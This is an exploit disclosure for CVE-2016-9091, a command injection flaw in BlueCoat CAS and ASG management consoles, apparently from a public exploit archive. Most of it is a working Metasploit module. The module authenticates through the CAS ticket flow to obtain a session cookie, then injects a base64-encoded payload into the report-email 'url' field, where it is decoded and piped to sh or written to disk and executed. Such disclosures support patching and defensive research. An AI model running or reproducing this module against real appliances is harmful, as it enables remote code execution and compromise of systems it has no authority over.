# Date: April 3, 2017
# Exploit Authors:  Chris Hebert, Peter Paccione and Corey Boyd
# Vendor Security Advisory: https://bto.bluecoat.com/security-advisory/sa138
# Version: CAS 1.3 prior to 1.3.7.4 & ASG 6.6 prior to 6.6.5.4 are vulnerable
# Tested on: BlueCoat CAS 1.3.7.1
# CVE : cve-2016-9091
 
Timeline:
--------
08/31/2016 (Vulnerablities Discovered)
03/31/2017 (Final Vendor Patch Confirmed)
04/03/2017 (Public Release)
 
Description:
The BlueCoat ASG and CAS management consoles are susceptible to an OS command injection vulnerability.
An authenticated malicious administrator can execute arbitrary OS commands with the privileges of the tomcat user.
 
Proof of Concept:
 
Metasploit Module - Remote Command Injection (via Report Email)
-----------------
 
##
# This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
  Rank = AverageRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "BlueCoat CAS 1.3.7.1 \"Report Email\" Command Injection",
      &#039;Description&#039;    => %q{
        the Report Email functionality.  This module exploits the vulnerability, resulting in tomcat execute permissions.
        Any authenticated user within the &#039;administrator&#039; group is able to exploit this; however, a user within the &#039;Readonly&#039; group cannot.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;       => [
         &#039;Chris Hebert <chrisdhebert[at]gmail.com>&#039;,
         &#039;Pete Paccione <petepaccione[at]gmail.com>&#039;,
         &#039;Corey Boyd <corey.k.boyd[at]gmail.com>&#039;
      ],
      &#039;DisclosureDate&#039; => &#039;Vendor Contacted 8-31-2016&#039;,
      &#039;Platform&#039;      => %w{ linux unix },
      &#039;Targets&#039;        =>
        [
          [&#039;BlueCoat CAS 1.3.7.1&#039;, {}],
        ],
      &#039;DefaultTarget&#039;  => 0,
 
      &#039;Arch&#039;          => [ ARCH_X86, ARCH_X64, ARCH_CMD ],   
      &#039;Payload&#039;       =>
         {
           &#039;BadChars&#039; => &#039;&#039;,
           &#039;Compat&#039;   =>
             {
               #&#039;PayloadType&#039; => &#039;cmd python cmd_bash cmd_interact&#039;,   
               #&#039;RequiredCmd&#039; => &#039;generic perl python openssl bash awk&#039;,   # metasploit may need to fix [bash,awk]
             }
         },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2016-9091&#039;],
          [&#039;EDB&#039;, &#039;##TBD##&#039;],
          [&#039;URL&#039;, &#039;https://bto.bluecoat.com/security-advisory/sa138&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039; => true
        },
      &#039;Privileged&#039;     => true))
 
      register_options([
        Opt::RPORT(8082),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Single username&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Single password&#039; ])
      ], self.class)
  end
 
  #Check BlueCoat CAS version - unauthenticated via GET /avenger/rest/version
  def check
    res = send_request_raw({
       &#039;method&#039; => &#039;GET&#039;,
       &#039;uri&#039; => normalize_uri(target_uri.path, &#039;avenger&#039;, &#039;rest&#039;, &#039;version&#039;)
    })
 
    clp_version = res.body.split("\<\/serialNumber\>\<version\>")
    clp_version = clp_version[1]
    clp_version = clp_version.split("\<")
    clp_version = clp_version[0]
    if res and clp_version != "1.3.7.1"
      print_status("#{peer} - ERROR - BlueCoat version #{clp_version}, but must be 1.3.7.1")
      fail_with(Failure::NotVulnerable, "BlueCoat version #{clp_version}, but must be 1.3.7.1")
    end
    return Exploit::CheckCode::Vulnerable
  end
  def exploit
    print_status("#{peer} - Checking for vulnerable BlueCoat Host...")
    if check != CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "FAILED Exploit - BlueCoat not version 1.3.7.1")
    end
 
    print_status("#{peer} - Running Exploit...")
    post = {
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    }
 
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;cas&#039;, &#039;v1&#039;, &#039;tickets&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post
    })
 
    unless res && res.code == 201
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end
 
    redirect = res.headers[&#039;Location&#039;]
    ticket1 = redirect.split("\/tickets\/").last
    print_status("#{peer} - Step 1 - REQ:Login -> RES:Ticket1 -> #{ticket1}")
 
    post = {
      &#039;service&#039; => &#039;http://localhost:8447/avenger/j_spring_cas_security_check&#039;
    }
 
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;cas&#039;, &#039;v1&#039;, &#039;tickets&#039;, "#{ticket1}"),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post
    })
 
    ticket2 = res.body
    print_status("#{peer} - Step 2 - REQ:Ticket1 -> RES:Ticket2 -> #{ticket2}")
 
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "avenger/j_spring_cas_security_check?dc=1472496573838&ticket=#{ticket2}")
    })
 
    unless res && res.code == 302
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end
    cookie = res.get_cookies
    print_status("#{peer} - Step 3 - REQ:Ticket2 -> RES:COOKIE -> #{cookie}")
 
    if cookie.blank?
      print_error("#{peer} - Could not retrieve a cookie")
      return
    end
 
    unless res && res.code == 302
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end
 
    cookie = res.get_cookies
 
    if cookie.blank?
      print_error("#{peer} - Could not retrieve the authenticated cookie")
      return
    end
 
    print_status("#{peer} - LOGIN Process Complete ...")
    print_status("#{peer} - Exploiting Bluecoat CAS v1.3.7.1 - Report Email ...")
 
 
    if payload.raw.include?("perl") || payload.raw.include?("python") || payload.raw.include?("openssl")
      #print_status("#{peer} - DEBUG: asci payload (perl,python, openssl,?bash,awk ")
      post = "{\"reportType\":\"jpg\",\"url\":\"http\:\/\/localhost:8447/dev-report-overview.html\;echo #{Rex::Text.encode_base64(payload.raw)}|base64 -d|sh;\",\"subject\":\"CAS #{datastore["RHOST"]}: CAS Overview Report\"}"
    else
      post = "{\"reportType\":\"jpg\",\"url\":\"http\:\/\/localhost:8447/dev-report-overview.html\;echo #{Rex::Text.encode_base64(payload.raw)}|base64 -d>/var/log/metasploit.bin;chmod +x /var/log/metasploit.bin;/var/log/metasploit.bin;\",\"subject\":\"CAS #{datastore["RHOST"]}: CAS Overview Report\"}"
    end
 
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;avenger&#039;, &#039;rest&#039;, &#039;report-email&#039;, &#039;send&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie,
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => post
    })
    print_status("#{peer} - Payload sent ...") 
  end
 
end

